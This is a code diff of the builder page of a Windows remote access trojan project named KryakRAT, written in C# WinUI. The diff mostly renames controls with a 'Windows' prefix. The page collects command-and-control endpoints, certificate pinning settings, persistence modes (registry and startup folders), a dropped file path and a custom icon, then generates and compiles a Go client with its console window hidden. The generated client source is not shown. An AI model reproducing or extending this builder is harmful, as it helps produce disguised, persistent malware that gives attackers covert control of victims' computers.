@@ -17,15 +17,15 @@ namespace KryakRAT.Pages
 {
     public sealed partial class BuilderPage : Page
     {
-        private readonly ObservableCollection<ConnectionEntry> _connections = [];
-        private readonly List<string> _ipConnections = [];
-        private readonly List<string> _rawConnections = [];
+        private readonly ObservableCollection<ConnectionEntry> _windowsConnections = [];
+        private readonly List<string> _windowsIpConnections = [];
+        private readonly List<string> _windowsRawConnections = [];
 
         public BuilderPage()
         {
             InitializeComponent();
-            ConnectionListView.ItemsSource = _connections;
-            UpdateConnectionCount();
+            WindowsConnectionListView.ItemsSource = _windowsConnections;
+            UpdateWindowsConnectionCount();
 
             Loaded += BuilderPage_Loaded;
             Unloaded += BuilderPage_Unloaded;
@@ -53,28 +53,28 @@ namespace KryakRAT.Pages
             UpdateTrustButtonState();
         }
 
-        private void ConnectionModeRadio_Checked(object sender, RoutedEventArgs e)
+        private void WindowsConnectionModeRadio_Checked(object sender, RoutedEventArgs e)
         {
-            if (IpPortInputPanel == null || RawInputPanel == null)
+            if (WindowsIpPortInputPanel == null || WindowsRawInputPanel == null)
             {
                 return;
             }
 
             bool rawMode = sender is RadioButton radio &&
-                           string.Equals(radio.Name, nameof(RawModeRadio), StringComparison.Ordinal);
+                           string.Equals(radio.Name, nameof(WindowsRawModeRadio), StringComparison.Ordinal);
 
-            IpPortInputPanel.Visibility = rawMode ? Visibility.Collapsed : Visibility.Visible;
-            RawInputPanel.Visibility = rawMode ? Visibility.Visible : Visibility.Collapsed;
+            WindowsIpPortInputPanel.Visibility = rawMode ? Visibility.Collapsed : Visibility.Visible;
+            WindowsRawInputPanel.Visibility = rawMode ? Visibility.Visible : Visibility.Collapsed;
         }
 
-        private async void AddConnectionButton_Click(object sender, RoutedEventArgs e)
+        private async void WindowsAddConnectionButton_Click(object sender, RoutedEventArgs e)
         {
             string? item = null;
-            bool isRaw = RawModeRadio.IsChecked == true;
+            bool isRaw = WindowsRawModeRadio.IsChecked == true;
 
             if (isRaw)
             {
-                string raw = RawUrlTextBox.Text.Trim();
+                string raw = WindowsRawUrlTextBox.Text.Trim();
                 if (string.IsNullOrWhiteSpace(raw))
                 {
                     await ShowSimpleDialogAsync("Warning", "Please enter a RAW URL.");
@@ -82,12 +82,12 @@ namespace KryakRAT.Pages
                 }
 
                 item = raw;
-                RawUrlTextBox.Text = string.Empty;
+                WindowsRawUrlTextBox.Text = string.Empty;
             }
             else
             {
-                string ip = IpTextBox.Text.Trim();
-                string port = PortTextBox.Text.Trim();
+                string ip = WindowsIpTextBox.Text.Trim();
+                string port = WindowsPortTextBox.Text.Trim();
                 if (string.IsNullOrWhiteSpace(ip) || string.IsNullOrWhiteSpace(port))
                 {
                     await ShowSimpleDialogAsync("Warning", "Please enter an IP address and port.");
@@ -95,11 +95,11 @@ namespace KryakRAT.Pages
                 }
 
                 item = $"{ip}:{port}";
-                IpTextBox.Text = string.Empty;
-                PortTextBox.Text = string.Empty;
+                WindowsIpTextBox.Text = string.Empty;
+                WindowsPortTextBox.Text = string.Empty;
             }
 
-            foreach (ConnectionEntry existing in _connections)
+            foreach (ConnectionEntry existing in _windowsConnections)
             {
                 if (existing.IsRaw == isRaw && string.Equals(existing.Value, item, StringComparison.OrdinalIgnoreCase))
                 {
@@ -108,90 +108,90 @@ namespace KryakRAT.Pages
                 }
             }
 
-            _connections.Add(new ConnectionEntry(item, isRaw));
+            _windowsConnections.Add(new ConnectionEntry(item, isRaw));
 
             if (isRaw)
             {
-                _rawConnections.Add(item);
+                _windowsRawConnections.Add(item);
             }
             else
             {
-                _ipConnections.Add(item);
+                _windowsIpConnections.Add(item);
             }
 
-            UpdateConnectionCount();
+            UpdateWindowsConnectionCount();
         }
 
-        private void RemoveConnectionButton_Click(object sender, RoutedEventArgs e)
+        private void WindowsRemoveConnectionButton_Click(object sender, RoutedEventArgs e)
         {
             if (sender is not Button button || button.Tag is not ConnectionEntry entry)
             {
                 return;
             }
 
-            _connections.Remove(entry);
+            _windowsConnections.Remove(entry);
 
             if (entry.IsRaw)
             {
-                _rawConnections.Remove(entry.Value);
+                _windowsRawConnections.Remove(entry.Value);
             }
             else
             {
-                _ipConnections.Remove(entry.Value);
+                _windowsIpConnections.Remove(entry.Value);
             }
 
-            UpdateConnectionCount();
+            UpdateWindowsConnectionCount();
         }
 
-        private void CustomIconCheckBox_Checked(object sender, RoutedEventArgs e)
+        private void WindowsCustomIconCheckBox_Checked(object sender, RoutedEventArgs e)
         {
-            IconPathTextBox.IsEnabled = true;
-            BrowseIconButton.IsEnabled = true;
+            WindowsIconPathTextBox.IsEnabled = true;
+            WindowsBrowseIconButton.IsEnabled = true;
         }
 
-        private void CustomIconCheckBox_Unchecked(object sender, RoutedEventArgs e)
+        private void WindowsCustomIconCheckBox_Unchecked(object sender, RoutedEventArgs e)
         {
-            IconPathTextBox.IsEnabled = false;
-            BrowseIconButton.IsEnabled = false;
+            WindowsIconPathTextBox.IsEnabled = false;
+            WindowsBrowseIconButton.IsEnabled = false;
         }
 
-        private void DropCheckBox_Checked(object sender, RoutedEventArgs e)
+        private void WindowsDropCheckBox_Checked(object sender, RoutedEventArgs e)
         {
-            FileNameTextBox.IsEnabled = true;
-            DropDirectoryTextBox.IsEnabled = true;
+            WindowsFileNameTextBox.IsEnabled = true;
+            WindowsDropDirectoryTextBox.IsEnabled = true;
         }
 
-        private void DropCheckBox_Unchecked(object sender, RoutedEventArgs e)
+        private void WindowsDropCheckBox_Unchecked(object sender, RoutedEventArgs e)
         {
-            FileNameTextBox.IsEnabled = false;
-            DropDirectoryTextBox.IsEnabled = false;
+            WindowsFileNameTextBox.IsEnabled = false;
+            WindowsDropDirectoryTextBox.IsEnabled = false;
         }
 
-        private void StartupModeRadio_Checked(object sender, RoutedEventArgs e)
+        private void WindowsStartupModeRadio_Checked(object sender, RoutedEventArgs e)
         {
-            if (NoStartupRadio == null || RegistryStartupRadio == null || DropCheckBox == null)
+            if (WindowsNoStartupRadio == null || WindowsRegistryStartupRadio == null || WindowsDropCheckBox == null)
             {
                 return;
             }
 
-            bool dropAllowed = NoStartupRadio.IsChecked == true || RegistryStartupRadio.IsChecked == true;
-            DropCheckBox.IsEnabled = dropAllowed;
+            bool dropAllowed = WindowsNoStartupRadio.IsChecked == true || WindowsRegistryStartupRadio.IsChecked == true;
+            WindowsDropCheckBox.IsEnabled = dropAllowed;
 
-            if (!dropAllowed && DropCheckBox.IsChecked == true)
+            if (!dropAllowed && WindowsDropCheckBox.IsChecked == true)
             {
-                DropCheckBox.IsChecked = false;
+                WindowsDropCheckBox.IsChecked = false;
             }
         }
 
-        private void PinnedModeRadio_Checked(object sender, RoutedEventArgs e)
+        private void WindowsPinnedModeRadio_Checked(object sender, RoutedEventArgs e)
         {
-            PinnedOptionsPanel.Visibility = Visibility.Visible;
+            WindowsPinnedOptionsPanel.Visibility = Visibility.Visible;
             UpdateTrustButtonState();
         }
 
-        private void PinnedModeRadio_Unchecked(object sender, RoutedEventArgs e)
+        private void WindowsPinnedModeRadio_Unchecked(object sender, RoutedEventArgs e)
         {
-            PinnedOptionsPanel.Visibility = Visibility.Collapsed;
+            WindowsPinnedOptionsPanel.Visibility = Visibility.Collapsed;
         }
 
         private void TrustCurrentCertificateButton_Click(object sender, RoutedEventArgs e)
@@ -201,10 +201,10 @@ namespace KryakRAT.Pages
                 return;
             }
 
-            FingerprintTextBox.Text = App.Server.CurrentCertificateFingerprint;
+            WindowsFingerprintTextBox.Text = App.Server.CurrentCertificateFingerprint;
         }
 
-        private async void BrowseIconButton_Click(object sender, RoutedEventArgs e)
+        private async void WindowsBrowseIconButton_Click(object sender, RoutedEventArgs e)
         {
             if (App.MainWindow is null)
             {
@@ -223,250 +223,253 @@ namespace KryakRAT.Pages
                 return;
             }
 
-            IconPathTextBox.Text = file.Path;
+            WindowsIconPathTextBox.Text = file.Path;
         }
 
-        private void UpdateConnectionCount()
+        private void UpdateWindowsConnectionCount()
         {
-            ConnectionCountText.Text = _connections.Count == 0
+            WindowsConnectionCountText.Text = _windowsConnections.Count == 0
                 ? "No endpoints added"
-                : $"Endpoints: {_connections.Count} (IP: {_ipConnections.Count}, Raw: {_rawConnections.Count})";
+                : $"Endpoints: {_windowsConnections.Count} (IP: {_windowsIpConnections.Count}, Raw: {_windowsRawConnections.Count})";
         }
 
         private void UpdateTrustButtonState()
         {
-            TrustCurrentCertificateButton.IsEnabled = App.Server.IsRunning && PinnedModeRadio.IsChecked == true;
+            WindowsTrustCurrentCertificateButton.IsEnabled = App.Server.IsRunning && WindowsPinnedModeRadio.IsChecked == true;
         }
 
         private async void BuildButton_Click(object sender, RoutedEventArgs e)
         {
-            BuildButton.IsEnabled = false;
-            try
+            if (BuiderTabView.SelectedIndex == 0) // Windows
             {
-            bool? hasGo = null;
-
-            try
-            {
-                Process.Start("go", "version")?.Kill();
-                hasGo = true;
-            }
-            catch
-            {
-                hasGo = File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe"));
-            }
-            if (hasGo == false)
-            {
-                ContentDialog dialog = new()
+                BuildButton.IsEnabled = false;
+                try
                 {
-                    Title = "Go Not Found",
-                    Content = "Go compiler is required to build the client.\n\nYou can install Go manually or use the automatic installer.",
-                    XamlRoot = XamlRoot,
+                    bool? hasGo = null;
 
-                    PrimaryButtonText = "Install Automatically",
-                    CloseButtonText = "Cancel",
-                    DefaultButton = ContentDialogButton.Primary
-                };
+                    try
+                    {
+                        Process.Start("go", "version")?.Kill();
+                        hasGo = true;
+                    }
+                    catch
+                    {
+                        hasGo = File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe"));
+                    }
+                    if (hasGo == false)
+                    {
+                        ContentDialog dialog = new()
+                        {
+                            Title = "Go Not Found",
+                            Content = "Go compiler is required to build the client.\n\nYou can install Go manually or use the automatic installer.",
+                            XamlRoot = XamlRoot,
 
-                ContentDialogResult result = await dialog.ShowAsync();
-                if (result == ContentDialogResult.Primary)
-                {
-                    bool installed = await InstallGoWithProgressAsync();
-                }
-                return;
-            }
-            if (_connections.Count == 0)
-            {
-                ContentDialog dialog = new()
-                {
-                    Title = "No Endpoints",
-                    Content = "Please add at least one connection endpoint before building the client.",
-                    XamlRoot = XamlRoot,
-                };
-                dialog.PrimaryButtonText = "OK";
-                _ = dialog.ShowAsync();
-                return;
-            }
-            if (PinnedModeRadio.IsChecked == true && string.IsNullOrWhiteSpace(FingerprintTextBox.Text))
-            {
-                ContentDialog dialog = new()
-                {
-                    Title = "No Certificate Fingerprint",
-                    Content = "Please trust the current server certificate or enter a fingerprint manually.",
-                    XamlRoot = XamlRoot,
-                };
-                dialog.PrimaryButtonText = "OK";
-                _ = dialog.ShowAsync();
-                return;
-            }
-            if (CustomIconCheckBox.IsChecked == true && !File.Exists(IconPathTextBox.Text))
-            {
-                ContentDialog dialog = new()
-                {
-                    Title = "No Icon Path",
-                    Content = "Please select an icon file or uncheck the custom icon option.",
-                    XamlRoot = XamlRoot,
-                };
-                dialog.PrimaryButtonText = "OK";
-                _ = dialog.ShowAsync();
-                return;
-            }
-            if (DropCheckBox.IsChecked == true && (string.IsNullOrWhiteSpace(FileNameTextBox.Text) || string.IsNullOrWhiteSpace(DropDirectoryTextBox.Text)))
-            {
-                ContentDialog dialog = new()
-                {
-                    Title = "Invalid Drop Settings",
-                    Content = "Please enter a valid file name and drop directory or uncheck the drop option.",
-                    XamlRoot = XamlRoot,
-                };
-                dialog.PrimaryButtonText = "OK";
-                _ = dialog.ShowAsync();
-                return;
-            }
-            string goPath;
-            if (File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe")))
-            {
-                goPath = Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe");
-            }
-            else
-            {
-                goPath = "go";
-            }
+                            PrimaryButtonText = "Install Automatically",
+                            CloseButtonText = "Cancel",
+                            DefaultButton = ContentDialogButton.Primary
+                        };
 
-            string[] ipList = _ipConnections.ToArray();
-            string[] rawList = _rawConnections.ToArray();
-            string clientTag = ClientTagTextBox.Text;
-            string securityMode = InsecureModeRadio.IsChecked == true
-                ? "insecure"
-                : PinnedModeRadio.IsChecked == true ? "pinned" : "strict";
-            string pinnedFingerprint = FingerprintTextBox.Text;
-            int startupMode =
-            NoStartupRadio.IsChecked == true ? 0 :
-            FolderStartupRadio.IsChecked == true ? 1 :
-            FolderAllUsersStartupRadio.IsChecked == true ? 2 : 3;
-            if (App.MainWindow is null)
-            {
-                await ShowSimpleDialogAsync("Build Failed", "Main window is unavailable.");
-                return;
-            }
-            string dropDirectory = string.Empty;
-            if (DropCheckBox.IsChecked == true)
-            {
-                dropDirectory = Path.Join(DropDirectoryTextBox.Text.Trim(), FileNameTextBox.Text.Trim());
-            }
-
-            FileSavePicker savePicker = new();
-            nint hwnd = WindowNative.GetWindowHandle(App.MainWindow);
-            InitializeWithWindow.Initialize(savePicker, hwnd);
-            savePicker.SuggestedStartLocation = PickerLocationId.Downloads;
-            savePicker.FileTypeChoices.Add("Executable file", [".exe"]);
-            savePicker.SuggestedFileName = "client.exe";
-
-            StorageFile? outputFile = await savePicker.PickSaveFileAsync();
-            if (outputFile is null)
-            {
-                return;
-            }
-
-            string tempBuildDir = Path.Combine(Path.GetTempPath(), "kryakclient-build");
-            Directory.CreateDirectory(tempBuildDir);
-
-             AppNotification buildNotification = new AppNotificationBuilder()
-            .AddText("Build started")
-            .AddText("Compiling client, please wait...")
-            .BuildNotification();
-
-             AppNotificationManager.Default.Show(buildNotification);
-
-            string tempGoPath = Path.Combine(tempBuildDir, "main.go");
-            string tempModPath = Path.Combine(tempBuildDir, "go.mod");
-            string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
-            File.Delete(Path.Combine(tempBuildDir, "rsrc.syso"));
-            File.WriteAllText(tempGoPath, WindowsClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode, dropDirectory));
-            File.WriteAllText(tempModPath, WindowsClientSourceCode.GetModCode());
-            File.WriteAllText(tempSumPath, WindowsClientSourceCode.GetSumCode());
-
-            if (CustomIconCheckBox.IsChecked == true)
-            {
-                if (!File.Exists(IconPathTextBox.Text.Trim()))
-                {
-                    await ShowSimpleDialogAsync("Build Failed", "Selected icon file does not exist.");
-                    return;
-                }
-                ProcessStartInfo iconInfo = new()
-                {
-                    FileName = goPath.Replace("go.exe", "rsrc.exe"),
-                    Arguments = $" -ico {IconPathTextBox.Text.Trim()} -o {Path.Combine(tempBuildDir, "rsrc.syso")}",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    WorkingDirectory = tempBuildDir
-                };
-                using Process? processIcon = Process.Start(iconInfo);
-                if (processIcon is null)
-                {
-                        await ShowSimpleDialogAsync("Build Failed", "Failed to start rsrc process.");
+                        ContentDialogResult result = await dialog.ShowAsync();
+                        if (result == ContentDialogResult.Primary)
+                        {
+                            bool installed = await InstallGoWithProgressAsync();
+                        }
                         return;
+                    }
+                    if (_windowsConnections.Count == 0)
+                    {
+                        ContentDialog dialog = new()
+                        {
+                            Title = "No Endpoints",
+                            Content = "Please add at least one connection endpoint before building the client.",
+                            XamlRoot = XamlRoot,
+                        };
+                        dialog.PrimaryButtonText = "OK";
+                        _ = dialog.ShowAsync();
+                        return;
+                    }
+                    if (WindowsPinnedModeRadio.IsChecked == true && string.IsNullOrWhiteSpace(WindowsFingerprintTextBox.Text))
+                    {
+                        ContentDialog dialog = new()
+                        {
+                            Title = "No Certificate Fingerprint",
+                            Content = "Please trust the current server certificate or enter a fingerprint manually.",
+                            XamlRoot = XamlRoot,
+                        };
+                        dialog.PrimaryButtonText = "OK";
+                        _ = dialog.ShowAsync();
+                        return;
+                    }
+                    if (WindowsCustomIconCheckBox.IsChecked == true && !File.Exists(WindowsIconPathTextBox.Text))
+                    {
+                        ContentDialog dialog = new()
+                        {
+                            Title = "No Icon Path",
+                            Content = "Please select an icon file or uncheck the custom icon option.",
+                            XamlRoot = XamlRoot,
+                        };
+                        dialog.PrimaryButtonText = "OK";
+                        _ = dialog.ShowAsync();
+                        return;
+                    }
+                    if (WindowsDropCheckBox.IsChecked == true && (string.IsNullOrWhiteSpace(WindowsFileNameTextBox.Text) || string.IsNullOrWhiteSpace(WindowsDropDirectoryTextBox.Text)))
+                    {
+                        ContentDialog dialog = new()
+                        {
+                            Title = "Invalid Drop Settings",
+                            Content = "Please enter a valid file name and drop directory or uncheck the drop option.",
+                            XamlRoot = XamlRoot,
+                        };
+                        dialog.PrimaryButtonText = "OK";
+                        _ = dialog.ShowAsync();
+                        return;
+                    }
+                    string goPath;
+                    if (File.Exists(Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe")))
+                    {
+                        goPath = Path.Combine(GetPackagedLocalPath(), "go", "bin", "go.exe");
+                    }
+                    else
+                    {
+                        goPath = "go";
+                    }
+
+                    string[] ipList = _windowsIpConnections.ToArray();
+                    string[] rawList = _windowsRawConnections.ToArray();
+                    string clientTag = WindowsClientTagTextBox.Text;
+                    string securityMode = WindowsInsecureModeRadio.IsChecked == true
+                        ? "insecure"
+                        : WindowsPinnedModeRadio.IsChecked == true ? "pinned" : "strict";
+                    string pinnedFingerprint = WindowsFingerprintTextBox.Text;
+                    int startupMode =
+                    WindowsNoStartupRadio.IsChecked == true ? 0 :
+                    WindowsFolderStartupRadio.IsChecked == true ? 1 :
+                    WindowsFolderAllUsersStartupRadio.IsChecked == true ? 2 : 3;
+                    if (App.MainWindow is null)
+                    {
+                        await ShowSimpleDialogAsync("Build Failed", "Main window is unavailable.");
+                        return;
+                    }
+                    string dropDirectory = string.Empty;
+                    if (WindowsDropCheckBox.IsChecked == true)
+                    {
+                        dropDirectory = Path.Join(WindowsDropDirectoryTextBox.Text.Trim(), WindowsFileNameTextBox.Text.Trim());
+                    }
+
+                    FileSavePicker savePicker = new();
+                    nint hwnd = WindowNative.GetWindowHandle(App.MainWindow);
+                    InitializeWithWindow.Initialize(savePicker, hwnd);
+                    savePicker.SuggestedStartLocation = PickerLocationId.Downloads;
+                    savePicker.FileTypeChoices.Add("Executable file", [".exe"]);
+                    savePicker.SuggestedFileName = "client.exe";
+
+                    StorageFile? outputFile = await savePicker.PickSaveFileAsync();
+                    if (outputFile is null)
+                    {
+                        return;
+                    }
+
+                    string tempBuildDir = Path.Combine(Path.GetTempPath(), "kryakclient-build");
+                    Directory.CreateDirectory(tempBuildDir);
+
+                    AppNotification buildNotification = new AppNotificationBuilder()
+                   .AddText("Build started")
+                   .AddText("Compiling client, please wait...")
+                   .BuildNotification();
+
+                    AppNotificationManager.Default.Show(buildNotification);
+
+                    string tempGoPath = Path.Combine(tempBuildDir, "main.go");
+                    string tempModPath = Path.Combine(tempBuildDir, "go.mod");
+                    string tempSumPath = Path.Combine(tempBuildDir, "go.sum");
+                    File.Delete(Path.Combine(tempBuildDir, "rsrc.syso"));
+                    File.WriteAllText(tempGoPath, WindowsClientSourceCode.GetClientCode(ipList, rawList, clientTag, securityMode, pinnedFingerprint, startupMode, dropDirectory));
+                    File.WriteAllText(tempModPath, WindowsClientSourceCode.GetModCode());
+                    File.WriteAllText(tempSumPath, WindowsClientSourceCode.GetSumCode());
+
+                    if (WindowsCustomIconCheckBox.IsChecked == true)
+                    {
+                        if (!File.Exists(WindowsIconPathTextBox.Text.Trim()))
+                        {
+                            await ShowSimpleDialogAsync("Build Failed", "Selected icon file does not exist.");
+                            return;
+                        }
+                        ProcessStartInfo iconInfo = new()
+                        {
+                            FileName = goPath.Replace("go.exe", "rsrc.exe"),
+                            Arguments = $" -ico {WindowsIconPathTextBox.Text.Trim()} -o {Path.Combine(tempBuildDir, "rsrc.syso")}",
+                            UseShellExecute = false,
+                            CreateNoWindow = true,
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true,
+                            WorkingDirectory = tempBuildDir
+                        };
+                        using Process? processIcon = Process.Start(iconInfo);
+                        if (processIcon is null)
+                        {
+                            await ShowSimpleDialogAsync("Build Failed", "Failed to start rsrc process.");
+                            return;
+                        }
+
+                        string iconOut = await processIcon.StandardOutput.ReadToEndAsync();
+                        string iconErr = await processIcon.StandardError.ReadToEndAsync();
+                        await processIcon.WaitForExitAsync();
+
+                        if (processIcon.ExitCode != 0)
+                        {
+                            await ShowSimpleDialogAsync("Build Failed", $"rsrc failed:\n{iconErr}\n{iconOut}");
+                            return;
+                        }
+                    }
+                    ProcessStartInfo tidyInfo = new()
+                    {
+                        FileName = goPath,
+                        Arguments = "mod tidy",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        WorkingDirectory = tempBuildDir
+                    };
+
+                    using Process? tidyProcess = Process.Start(tidyInfo);
+                    await tidyProcess!.WaitForExitAsync();
+
+                    ProcessStartInfo startInfo = new()
+                    {
+                        FileName = goPath,
+                        Arguments = $"build -ldflags=\"-s -w -H windowsgui\" -trimpath -o \"{outputFile.Path}\" .",
+                        UseShellExecute = false,
+                        CreateNoWindow = true,
+                        RedirectStandardOutput = true,
+                        RedirectStandardError = true,
+                        WorkingDirectory = tempBuildDir
+                    };
+
+                    using Process? process = Process.Start(startInfo);
+                    if (process is null)
+                    {
+                        await ShowSimpleDialogAsync("Build Failed", "Failed to start Go compiler process.");
+                        return;
+                    }
+
+                    string stdOut = await process.StandardOutput.ReadToEndAsync();
+                    string stdErr = await process.StandardError.ReadToEndAsync();
+                    await process.WaitForExitAsync();
+
+                    if (process.ExitCode != 0)
+                    {
+                        string details = string.IsNullOrWhiteSpace(stdErr) ? stdOut : stdErr;
+                        await ShowSimpleDialogAsync("Build Failed", $"go build returned code {process.ExitCode}.\n\n{details}");
+                        return;
+                    }
+
+                    await ShowSimpleDialogAsync("Build Completed", $"Client executable saved to:\n{outputFile.Path}");
                 }
-
-                string iconOut = await processIcon.StandardOutput.ReadToEndAsync();
-                string iconErr = await processIcon.StandardError.ReadToEndAsync();
-                await processIcon.WaitForExitAsync();
-
-                if (processIcon.ExitCode != 0)
+                finally
                 {
-                    await ShowSimpleDialogAsync("Build Failed", $"rsrc failed:\n{iconErr}\n{iconOut}");
-                    return;
+                    BuildButton.IsEnabled = true;
                 }
-            }
-            ProcessStartInfo tidyInfo = new()
-            {
-                FileName = goPath,
-                Arguments = "mod tidy",
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                WorkingDirectory = tempBuildDir
-            };
-
-            using Process? tidyProcess = Process.Start(tidyInfo);
-            await tidyProcess!.WaitForExitAsync();
-
-            ProcessStartInfo startInfo = new()
-            {
-                FileName = goPath,
-                Arguments = $"build -ldflags=\"-s -w -H windowsgui\" -trimpath -o \"{outputFile.Path}\" .",
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                WorkingDirectory = tempBuildDir
-            };
-
-                using Process? process = Process.Start(startInfo);
-            if (process is null)
-            {
-                await ShowSimpleDialogAsync("Build Failed", "Failed to start Go compiler process.");
-                return;
-            }
-
-            string stdOut = await process.StandardOutput.ReadToEndAsync();
-            string stdErr = await process.StandardError.ReadToEndAsync();
-            await process.WaitForExitAsync();
-
-            if (process.ExitCode != 0)
-            {
-                string details = string.IsNullOrWhiteSpace(stdErr) ? stdOut : stdErr;
-                await ShowSimpleDialogAsync("Build Failed", $"go build returned code {process.ExitCode}.\n\n{details}");
-                return;
-            }
-
-            await ShowSimpleDialogAsync("Build Completed", $"Client executable saved to:\n{outputFile.Path}");
-            }
-            finally
-            {
-                BuildButton.IsEnabled = true;
             }
         }
 
